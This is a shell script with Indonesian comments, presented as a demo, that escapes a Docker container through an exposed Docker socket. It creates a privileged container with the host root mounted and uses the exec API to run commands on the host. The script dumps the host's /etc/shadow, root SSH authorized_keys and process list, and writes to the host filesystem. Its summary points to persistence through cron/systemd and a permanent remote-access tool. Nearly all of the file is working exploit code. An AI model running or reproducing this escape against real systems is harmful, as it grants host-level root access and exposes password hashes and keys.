#!/bin/sh
# ============================================================
#  Docker Escape — Demo & Explore
#  Fokus: buktikan perbedaan "root di container" vs "root di host"
#  Vector: Docker socket + exec API (bypass entrypoint issue)
# ============================================================

DOCKER_SOCK="/var/run/docker.sock"

C_RED='\033[91m'; C_GRN='\033[92m'; C_YLW='\033[93m'
C_BLU='\033[94m'; C_MAG='\033[95m'; C_RST='\033[0m'; C_BLD='\033[1m'

log()    { printf "${C_BLU}[*]${C_RST} %s\n" "$*"; }
ok()     { printf "${C_GRN}[+]${C_RST} %s\n" "$*"; }
err()    { printf "${C_RED}[-]${C_RST} %s\n" "$*"; }
warn()   { printf "${C_YLW}[!]${C_RST} %s\n" "$*"; }
section(){ printf "\n${C_BLD}${C_MAG}━━━ %s ━━━${C_RST}\n" "$*"; }
cmp()    { printf "  ${C_YLW}%-30s${C_RST} ${C_GRN}%s${C_RST}\n" "$1" "$2"; }

dsock(){ curl -s --unix-socket "$DOCKER_SOCK" "$@"; }

# ── Jalankan command di HOST via docker exec API ───────────
# 1. Buat container dengan /:/host mount (biarkan entrypoint jalan)
# 2. Tunggu container ready
# 3. docker exec → inject command kita (bypass entrypoint)
# 4. Ambil output, cleanup
host_exec(){
  local CMD="$1"

  # Buat container
  CID=$(dsock -X POST -H 'Content-Type: application/json' \
    -d "{\"Image\":\"${AVAIL_IMG}\",\"HostConfig\":{\"Binds\":[\"/:/host\"],\"Privileged\":true,\"NetworkMode\":\"host\"}}" \
    http://localhost/containers/create 2>/dev/null \
    | grep -o '"Id":"[^"]*"' | cut -d'"' -f4)
  [ -z "$CID" ] && { err "host_exec: gagal buat container"; return 1; }

  # Start
  dsock -X POST "http://localhost/containers/$CID/start" >/dev/null 2>&1
  sleep 2

  # Buat exec instance (tidak peduli entrypoint image)
  EXEC_ID=$(dsock -X POST -H 'Content-Type: application/json' \
    -d "{\"AttachStdout\":true,\"AttachStderr\":true,\"Cmd\":[\"/bin/sh\",\"-c\",\"${CMD}\"]}" \
    "http://localhost/containers/$CID/exec" 2>/dev/null \
    | grep -o '"Id":"[^"]*"' | cut -d'"' -f4)

  if [ -z "$EXEC_ID" ]; then
    err "host_exec: exec create gagal"
    dsock -X DELETE "http://localhost/containers/$CID?force=true" >/dev/null 2>&1
    return 1
  fi

  # Jalankan exec, ambil output
  OUT=$(dsock -X POST -H 'Content-Type: application/json' \
    -d '{"Detach":false,"Tty":false}' \
    "http://localhost/exec/$EXEC_ID/start" 2>/dev/null \
    | strings 2>/dev/null)

  # Cleanup
  dsock -X DELETE "http://localhost/containers/$CID?force=true" >/dev/null 2>&1

  printf '%s\n' "$OUT"
}

# ════════════════════════════════════════════════════════════
#  FASE 1: KITA DI MANA SEKARANG? (dalam container)
# ════════════════════════════════════════════════════════════
section "POSISI SEKARANG — DALAM CONTAINER"

log "Jalankan perintah dari DALAM container:"
printf "\n"
cmp "id"              "$(id 2>/dev/null)"
cmp "hostname"        "$(hostname 2>/dev/null)"
cmp "uname -r"        "$(uname -r 2>/dev/null)"
cmp "cat /etc/os-release" "$(grep PRETTY /etc/os-release 2>/dev/null | cut -d= -f2 | tr -d '"')"
cmp "/.dockerenv"     "$(ls /.dockerenv 2>/dev/null && echo ADA || echo tidak ada)"
cmp "PID 1 adalah"    "$(cat /proc/1/cmdline 2>/dev/null | tr '\0' ' ' | cut -c1-50)"
cmp "Jumlah proses"   "$(ls /proc | grep -c '^[0-9]' 2>/dev/null) PID visible"
cmp "Network"         "$(ip -4 addr show 2>/dev/null | grep inet | awk '{print $2}' | tr '\n' ' ')"
cmp "Mount /tmp"      "$(mount 2>/dev/null | grep ' /tmp ' | awk '{print $1,$3,$4}' | head -1)"
cmp "Bisa baca /etc/shadow host?" "$(cat /etc/shadow 2>/dev/null | wc -l) baris (container shadow)"

printf "\n"
warn "Yang TIDAK bisa kita lakukan dari sini:"
warn "  - Lihat proses host (ps aux hanya tampilkan container proses)"
warn "  - Akses file host asli (misal /root/.ssh/authorized_keys host)"
warn "  - Lihat container lain dari perspektif host"
warn "  - Bertahan jika container ini di-restart/delete"

# ════════════════════════════════════════════════════════════
#  FASE 2: ESCAPE VIA DOCKER SOCKET
# ════════════════════════════════════════════════════════════
section "ESCAPE VIA DOCKER SOCKET"

# Cek socket
[ -S "$DOCKER_SOCK" ] || { err "Docker socket tidak ada!"; exit 1; }
ok "Docker socket: $DOCKER_SOCK"

# Ambil image yang tersedia di host
IMAGES_JSON=$(dsock http://localhost/images/json 2>/dev/null)
AVAIL_IMG=$(printf '%s' "$IMAGES_JSON" \
  | grep -o '"RepoTags":\["[^"<][^"]*"' \
  | grep -v '<none>' | head -1 \
  | sed 's/"RepoTags":\["//' | tr -d '"')
[ -z "$AVAIL_IMG" ] && { err "Tidak ada image tersedia"; exit 1; }
ok "Menggunakan image: $AVAIL_IMG"
export AVAIL_IMG

# Konfirmasi host FS accessible
log "Verifikasi akses host filesystem..."
VERIFY=$(dsock -X POST -H 'Content-Type: application/json' \
  -d "{\"Image\":\"${AVAIL_IMG}\",\"Entrypoint\":[\"/bin/sh\",\"-c\"],\"Cmd\":[\"test -f /host/.dockerenv && echo IS_CONTAINER || echo IS_HOST\"],\"HostConfig\":{\"Binds\":[\"/:/host\"],\"Privileged\":true}}" \
  http://localhost/containers/create 2>/dev/null \
  | grep -o '"Id":"[^"]*"' | cut -d'"' -f4)

if [ -n "$VERIFY" ]; then
  dsock -X POST "http://localhost/containers/$VERIFY/start" >/dev/null 2>&1
  sleep 2
  VOUT=$(dsock "http://localhost/containers/$VERIFY/logs?stdout=1" 2>/dev/null | strings)
  dsock -X DELETE "http://localhost/containers/$VERIFY?force=true" >/dev/null 2>&1
  if echo "$VOUT" | grep -q IS_HOST; then
    ok "Host filesystem CONFIRMED accessible di /host"
  else
    warn "Entrypoint override tidak bekerja, switch ke exec API..."
  fi
fi

# ════════════════════════════════════════════════════════════
#  FASE 3: BUKTIKAN PERBEDAAN — LIHAT HOST DARI DALAM
# ════════════════════════════════════════════════════════════
section "PERBANDINGAN CONTAINER vs HOST"

log "Mengambil info HOST via docker exec..."

HOST_ID=$(host_exec "id")
HOST_HN=$(host_exec "hostname")
HOST_OS=$(host_exec "cat /host/etc/os-release 2>/dev/null | grep PRETTY | cut -d= -f2 | tr -d '\"'")
HOST_PROC_COUNT=$(host_exec "ls /proc | grep -c '^[0-9]'")
HOST_PID1=$(host_exec "cat /host/proc/1/cmdline 2>/dev/null | tr '\\0' ' ' | cut -c1-60")
HOST_NET=$(host_exec "ip -4 addr show 2>/dev/null | grep inet | awk '{print \$2}' | tr '\\n' ' '")
HOST_SHADOW=$(host_exec "wc -l < /host/etc/shadow 2>/dev/null || echo 0")
HOST_DOCKER_CONTAINERS=$(host_exec "ls /host/var/lib/docker/containers/ 2>/dev/null | wc -l")
HOST_SSH=$(host_exec "ls /host/root/.ssh/ 2>/dev/null || echo 'kosong/tidak ada'")
HOST_CRON=$(host_exec "ls /host/etc/cron.d/ 2>/dev/null | tr '\\n' ' '")
HOST_DOCKERENV=$(host_exec "test -f /host/.dockerenv && echo ADA || echo TIDAK ADA")

printf "\n"
printf "  ${C_BLD}%-30s %-30s %-30s${C_RST}\n" "PERINTAH" "DALAM CONTAINER" "HOST (via escape)"
printf "  %-30s %-30s %-30s\n" "$(printf '%0.s─' {1..29})" "$(printf '%0.s─' {1..29})" "$(printf '%0.s─' {1..29})"
printf "  %-30s %-30s ${C_GRN}%-30s${C_RST}\n" "id"              "$(id 2>/dev/null | cut -c1-28)" "${HOST_ID:-?}"
printf "  %-30s %-30s ${C_GRN}%-30s${C_RST}\n" "hostname"        "$(hostname | cut -c1-28)" "${HOST_HN:-?}"
printf "  %-30s %-30s ${C_GRN}%-30s${C_RST}\n" "OS"              "$(grep PRETTY /etc/os-release 2>/dev/null | cut -d= -f2 | tr -d '"' | cut -c1-28)" "${HOST_OS:-?}"
printf "  %-30s %-30s ${C_GRN}%-30s${C_RST}\n" "PID 1"          "$(cat /proc/1/cmdline 2>/dev/null | tr '\0' ' ' | cut -c1-28)" "${HOST_PID1:-?}"
printf "  %-30s %-30s ${C_GRN}%-30s${C_RST}\n" "Jumlah proses"   "$(ls /proc | grep -c '^[0-9]' 2>/dev/null)" "${HOST_PROC_COUNT:-?}"
printf "  %-30s %-30s ${C_GRN}%-30s${C_RST}\n" "Network"         "$(ip -4 addr show 2>/dev/null | grep inet | awk '{print $2}' | head -1)" "${HOST_NET:-?}"
printf "  %-30s %-30s ${C_GRN}%-30s${C_RST}\n" "/.dockerenv"     "ADA (dalam container)" "${HOST_DOCKERENV:-?}"
printf "  %-30s %-30s ${C_GRN}%-30s${C_RST}\n" "/etc/shadow baris" "$(wc -l < /etc/shadow 2>/dev/null)" "${HOST_SHADOW:-?}"
printf "  %-30s %-30s ${C_GRN}%-30s${C_RST}\n" "Containers di host" "-" "${HOST_DOCKER_CONTAINERS:-?} container"
printf "  %-30s %-30s ${C_GRN}%-30s${C_RST}\n" "/root/.ssh host" "-" "${HOST_SSH:-?}"
printf "  %-30s %-30s ${C_GRN}%-30s${C_RST}\n" "/etc/cron.d host" "-" "${HOST_CRON:-?}"

# ════════════════════════════════════════════════════════════
#  FASE 4: DEMO AKSI NYATA DI HOST
# ════════════════════════════════════════════════════════════
section "DEMO AKSI NYATA DI HOST"

# Baca /etc/shadow host
log "Baca /etc/shadow HOST (bukan container):"
SHADOW=$(host_exec "cat /host/etc/shadow 2>/dev/null | head -5")
if [ -n "$SHADOW" ]; then
  ok "/etc/shadow host:"
  printf '%s\n' "$SHADOW" | while IFS= read -r line; do
    printf "    ${C_GRN}%s${C_RST}\n" "$line"
  done
else
  warn "/etc/shadow tidak terbaca"
fi

# List proses host
log "Proses yang jalan di HOST:"
PROCS=$(host_exec "ps aux --no-headers 2>/dev/null | head -10 || cat /host/proc/[0-9]*/status 2>/dev/null | grep -E '^Name:' | head -10")
printf '%s\n' "$PROCS"

# Cek SSH host
log "SSH authorized_keys HOST:"
SSH_KEYS=$(host_exec "cat /host/root/.ssh/authorized_keys 2>/dev/null || echo 'tidak ada'")
printf '%s\n' "$SSH_KEYS"

# Tulis test file ke host FS
log "Test tulis ke host filesystem..."
WRITE_TEST=$(host_exec "echo 'escape_test_$(date +%s)' > /host/tmp/.escape_test && cat /host/tmp/.escape_test && rm /host/tmp/.escape_test")
if [ -n "$WRITE_TEST" ]; then
  ok "Tulis ke host FS berhasil: $WRITE_TEST"
else
  err "Tulis ke host FS gagal"
fi

# ════════════════════════════════════════════════════════════
#  RINGKASAN
# ════════════════════════════════════════════════════════════
section "KESIMPULAN"

printf "\n${C_BLD}Kenapa escape penting meski sudah root di container?${C_RST}\n\n"
printf "  ${C_RED}Root di container${C_RST}              ${C_GRN}Root di host (setelah escape)${C_RST}\n"
printf "  %-35s %s\n" "Filesystem terisolasi (overlay)"  "Akses SEMUA file di server asli"
printf "  %-35s %s\n" "PID namespace sendiri"            "Lihat & kill semua proses"
printf "  %-35s %s\n" "Network namespace container"      "Network host (semua port asli)"
printf "  %-35s %s\n" "Container delete = akses hilang"  "Persist via cron/systemd di host"
printf "  %-35s %s\n" "gsocket hanya hidup di container" "gsocket di host = PERMANEN"
printf "  %-35s %s\n" "Tidak bisa lihat container lain"  "Kontrol semua container via socket"
printf "  %-35s %s\n" "Tidak bisa baca /etc/shadow host" "Baca password, SSH key, cert host"

printf "\n${C_GRN}${C_BLD}[✓] Escape berhasil. Host filesystem accessible via docker socket.${C_RST}\n\n"
